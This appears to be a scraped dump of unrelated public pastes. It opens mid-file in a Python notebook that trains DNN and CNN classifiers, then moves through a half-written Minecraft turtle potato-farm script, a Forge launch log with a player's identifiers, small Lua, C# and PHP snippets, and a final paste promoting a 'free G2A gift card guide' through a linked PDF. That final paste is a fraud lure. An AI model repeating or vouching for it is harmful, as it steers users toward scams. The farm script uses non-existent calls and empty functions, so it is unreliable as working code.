std_train_cnn = np.std(X_train_cnn, axis=(0, 1, 2))
X_train_cnn_normalized = (X_train_cnn - mean_train_cnn) / std_train_cnn
X_test_cnn_normalized = (X_test_cnn - mean_train_cnn) / std_train_cnn

# DNN Model
dnn_model = create_dnn_model(len(X_train[0]))

# Training DNN Model
dnn_accuracy_history = []
epochs = 200

for epoch in tqdm_notebook(range(epochs)):
    history_dnn = dnn_model.fit(X_train_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=False)
    dnn_accuracy_history.append(history_dnn.history['accuracy'][0])

    if epoch == 1:
        y_pred_after_2nd_epoch_dnn = dnn_model.predict(X_test_normalized)
        y_pred_binary_after_2nd_epoch_dnn = [1 if pred >= 0.5 else 0 for pred in y_pred_after_2nd_epoch_dnn]
        image_testing_before_2nd_epoch_dnn = create_image(X_test_normalized, y_pred_binary_after_2nd_epoch_dnn, label_colors_testing)

    if epoch >= epochs - 1:
        print(f""HERE HERE Epoch: {epoch}, Epochs: {epochs}\n"")

        # Iterate through new persons
        for idx, personNEW_results in enumerate(new_persons_results, start=1):
            assert len(personNEW_results) == len(X_train[0]), ""Mismatch in the number of features.""
            personNEW_results_normalized = (np.array(personNEW_results) - mean_values) / std_values
            personNEW_prediction_dnn = dnn_model.predict(np.array([personNEW_results_normalized]))
            personNEW_label_dnn = 1 if personNEW_prediction_dnn >= 0.5 else 0
            y_pred_after_50_epochs_dnn = dnn_model.predict(X_test_normalized)
            y_pred_binary_after_50_epochs_dnn = [1 if pred >= 0.5 else 0 for pred in y_pred_after_50_epochs_dnn]
            image_testing_after_50_epochs_dnn = create_image(X_test_normalized, y_pred_binary_after_50_epochs_dnn, label_colors_testing)
            image_personNEW_dnn = create_imageN([personNEW_results_normalized], [personNEW_label_dnn], label_colors)
            plt.figure(figsize=(5, 5))
            plt.imshow(image_personNEW_dnn)
            plt.title(f""New Person {idx} - DNN\nLabel: {personNEW_label_dnn}, Prediction: {personNEW_prediction_dnn}"")
            plt.axis(""off"")
            plt.show()

# CNN Model
cnn_model = create_cnn_model((100, 100, 3))
np.set_printoptions(threshold=np.inf)

# Training CNN Model
cnn_accuracy_history = []

for epoch in tqdm_notebook(range(epochs)):
    history_cnn = cnn_model.fit(X_train_cnn_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=False)
    cnn_accuracy_history.append(history_cnn.history['accuracy'][0])

    if epoch == 1:
        y_pred_after_2nd_epoch_cnn = cnn_model.predict(X_test_cnn_normalized)
        y_pred_binary_after_2nd_epoch_cnn = [1 if pred >= 0.5 else 0 for pred in y_pred_after_2nd_epoch_cnn]
        image_testing_before_2nd_epoch_cnn = create_image(X_test_normalized, y_pred_binary_after_2nd_epoch_cnn, label_colors_testing)

    if epoch >= epochs - 1:
        print(f""HERE HERE Epoch: {epoch}, Epochs: {epochs}\n"")

        # Iterate through new persons
        for idx, personNEW_results in enumerate(new_persons_results, start=1):
            assert len(personNEW_results) == len(X_train[0]), ""Mismatch in the number of features.""
            
            # Check the new person's data before normalization
            print(f""Person {idx} original results: {personNEW_results}"")
            
            personNEW_results_normalized = (np.array(personNEW_results) - mean_values) / std_values
            print(f""Person {idx} normalized results: {personNEW_results_normalized}"")
            
            image_personNEW = create_imageN([personNEW_results_normalized], [0], label_colors)
            image_personNEW_resized = resize(image_personNEW[:, :-1], (100, 100, 3))
            image_personNEW_resized_normalized = (image_personNEW_resized - mean_train_cnn) / std_train_cnn  # Normalize new person image
            
            # Check the resized and normalized image
            print(f""Person {idx} resized and normalized image shape: {image_personNEW_resized_normalized.shape}"")
            print(f""Person {idx} resized and normalized image: {image_personNEW_resized_normalized}"")
            
            personNEW_prediction_cnn = cnn_model.predict(np.array([image_personNEW_resized_normalized]))
            print(f""Person {idx} prediction: {personNEW_prediction_cnn}"")
            
            personNEW_label_cnn = 1 if personNEW_prediction_cnn >= 0.5 else 0
            y_pred_after_epochs_cnn = cnn_model.predict(X_test_cnn_normalized)
            y_pred_binary_after_epochs_cnn = [1 if pred >= 0.5 else 0 for pred in y_pred_after_epochs_cnn]
            image_testing_after_epochs_cnn = create_image(X_test_normalized, y_pred_binary_after_epochs_cnn, label_colors_testing)
            image_personNEW_cnn = create_imageN([personNEW_results_normalized], [personNEW_label_cnn], label_colors)
            plt.figure(figsize=(5, 5))
            plt.imshow(image_personNEW_cnn)
            plt.title(f""New Person {idx} - CNN\nLabel: {personNEW_label_cnn}, Prediction: {personNEW_prediction_cnn}"")
            plt.axis(""off"")
            plt.show()
"
3HB7gWKf,potato,Harlaquin,Lua,Thursday 27th of June 2024 04:57:29 PM CDT,"--  Potato Farm Code
--  

southwest = {187, 66, 267}
sourtheast = {195, 66, 267}
northwest = {187, 66, 259}
northeast = {195, 66, 259}

fuelChest = {194, 66, 268}
storageChest = {188, 66, 268}
slotCount = 16

--  Returns for 'itemName' slot in inventory
function getItemIndex(itemName)
    for slot = 1, 16, 1 do
        item = turtle.getItemDetail(slot)
        if(item ~= nil) then
            if(item[""name""] == itemName) then
                return slot
            end
        end
    end
end


function checkFuel()
    turtle.select(1)
 
    if(turtle.getFuelLevel() < 50) then
        print(""Attempting Refuel..."")
        for slot = 1, slotCount, 1 do
            turtle.select(slot)
            if(turtle.refuel(1)) then
                return true
            end
        end

        return false
    else
        return true
    end
end


function getFuel()
    
end


-- returns turtle distance compared to target location and counts fuel cost
function getDistance(currX, currY, currZ)
    cordX, cordY, cordZ = turtle.gps.locate()
    fuelCost = turtle.getFuelLevel()
    --effeicency variable -checks if travel is possible
    efficiency = false

    compX = 3

    compared_set = {1, 1, 1}

    return distance, efficency
end



--  actual command to move to a given destination
function moveTo(x, y, z)
    destination = {x, y, z}

    if destination~=turtle.gps.locate()
    then
        --  moveing to location based on 
    end
end


--  main fuction to have a never ending farm
--  !!northeast is a place holder for the last block in the calculated inputs
--  !! make sure code can move side to side in a 8x8 grid repeating the dig/plant action 
--  !! has to stay inside placed location
while(1) do

    -- checks turtle for fuel
    if checkFuel()then

        startCord = turtle.gps.locate()
        fuelstat = turtle.getFuelLevel
        distan, efficiency_value = getDistance()

        --  checks if the turtle can make it back to the chest and moves to it
        --  if not then turtle powers down
        if efficiency_value == true then
            moveTo(fuelChest)
            turtle.suckDown()
            turtle.refuel()
            turtle.moveTo(startCord)
            if turtle.gps.locate()==startCord then
                break
            else
                print(""Error: Field Positions doesn't equal current position"" .. ""\nlocation: "" .. turtle.gps.locate() .. ""\nFuel Level: "" .. turtle.getFuelLevel())
                os.exit()
            end
        --  checks if turtle
        else
            isBlock, data = turtle.inspectDown()
            if(isBlock)
            then
                if (data['state']['age'] <= 7)
                then
                    turtle.digDown()
                    potatoIndex = getItemIndex(""minecraft:potato"")
                    turtle.select(potatoIndex)
                    turtle.placeDown()
                end
            else
                potatoIndex = getItemIndex(""minecraft:potato"")
                turtle.placeDown()
            end    
        end


    --  If turtle doesnt have fuel then it moves to chest, refuels, returns, then starts program from the top
    else 
        startCord = turtle.gps.locate()
        moveTo(fuelChest)
        turtle.refuel()
        if turtle.checkFuel() then
            moveTo(startCord)
        end
    end
end"
xqkV5YjL,Untitled,Eidelmaim,YAML,Thursday 27th of June 2024 03:29:14 PM CDT,"[27Jun2024 16:13:01.562] [main/INFO] [cpw.mods.modlauncher.Launcher/MODLAUNCHER]: ModLauncher running: args [--username, Eidelwild, --version, 1.21-forge-51.0.18, --gameDir, C:\Users\eidel\AppData\Roaming\.minecraft, --assetsDir, C:\Users\eidel\AppData\Roaming\.minecraft\assets, --assetIndex, 17, --uuid, 4b2f58fb4bad46f897c5f3f4d86bcaf7, --accessToken, **********, --clientId, YTc1ZDE5YzUtN2JkYy00YmY2LWFkZjAtYTY3Y2ZhZDYxZDM4, --xuid, 2533275001063765, --userType, msa, --versionType, release, --quickPlayPath, C:\Users\eidel\AppData\Roaming\.minecraft\quickPlay\java\1719519179418.json, --launchTarget, forge_client]
[27Jun2024 16:13:01.565] [main/INFO] [cpw.mods.modlauncher.Launcher/MODLAUNCHER]: JVM identified as Microsoft OpenJDK 64-Bit Server VM 21.0.3+9-LTS
[27Jun2024 16:13:01.566] [main/INFO] [cpw.mods.modlauncher.Launcher/MODLAUNCHER]: ModLauncher 10.2.1 starting: java version 21.0.3 by Microsoft; OS Windows 11 arch amd64 version 10.0"
903tBr0H,InspectX,TechManDylan,Lua,Thursday 27th of June 2024 03:08:25 PM CDT,"-- Function to generate a unique filename
function generateFilename()
    local i = 1
    local filename = ""inspect"" .. i .. "".txt""
    while fs.exists(filename) do
        i = i + 1
        filename = ""inspect"" .. i .. "".txt""
    end
    return filename
end

-- Function to inspect the block in front of the turtle
function inspectBlock()
    local success, data = turtle.inspect()
    if success then
        return data
    else
        return nil
    end
end

-- Main function
function main()
    local filename = generateFilename()
    local file = fs.open(filename, ""w"")
    local blockData = inspectBlock()
    
    if blockData then
        file.writeLine(""Block Information:"")
        for k, v in pairs(blockData) do
            if type(v) == ""table"" then
                file.writeLine(k .. "":"")
                for subKey, subValue in pairs(v) do
                    file.writeLine(""  "" .. subKey .. "": "" .. tostring(subValue))
                end
            else
                file.writeLine(k .. "": "" .. tostring(v))
            end
        end
    else
        file.writeLine(""No block detected."")
    end

    file.close()
    print(""Inspection data written to "" .. filename)
end

-- Execute the main function
main()
"
qyW8ayg8,Untitled,Chefir,C#,Thursday 27th of June 2024 03:01:41 PM CDT,"int sumboxOffice = 0;
Queue<int> customers = new Queue<int>();
customers.Enqueue(560);
customers.Enqueue(2569);
customers.Enqueue(7867);
customers.Enqueue(328);
customers.Enqueue(987);

while (customers.Count > 0)
{
    Console.WriteLine($""–£ –≤–∞—Å –Ω–∞ –∫–∞—Å—Å–µ –¥–µ–Ω—è–≥: {sumboxOffice}, –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –ª—é—é–±—É—é –∫–Ω–æ–ø–∫—É, –∏ –∫–∞—Å—Å–∞ –±—É–¥–µ –ø–æ–ø–æ–ª–Ω—è—Ç—å—Å—è"");
    Console.ReadKey();
    Console.Clear();
    sumboxOffice += customers.Dequeue();
}

Console.WriteLine($""–ö–∞—Å—Å–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∞ {sumboxOffice}, –¥–µ–Ω—å–≥–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –Ω–∞ —Å—á–µ—Ç."");"
sgCET5Tu,check posted data for array and string,helgatheviki,PHP,Thursday 27th of June 2024 02:27:58 PM CDT,"$posted_field_name   = 'mnm_quantity';
 
$child_item_quantity = ! empty( $_REQUEST[ $posted_field_name ] ) && ! empty( $_REQUEST[ $posted_field_name ][ $child_product_id ] ) ? intval( $_REQUEST[ $posted_field_name ][ $child_product_id ] ) : 0;

// One more check for inputs that are not arrays. Ajax add to cart will frequently not handle array inputs well (esp in themes) so as a last resort let's check for a single string key: ie: ""mnm_quantity[99]"".
if ( $child_item_quantity <= 0 ) {
	$posted_field_name   .= '[' . $child_product_id . ']';
	$child_item_quantity = ! empty( $_REQUEST[ $posted_field_name ] ) ? intval( $_REQUEST[ $posted_field_name ] ) : 0;
}
"
uhvirbUU,üéÅ G2A.COM FREE GIFT CARD GUIDE JUN 2024 V5 üéÅ,kaka440ka,GetText,Thursday 27th of June 2024 02:09:07 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.,

This is the most up to date version of this script. Any other one posted will not work
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
27 June 2024"
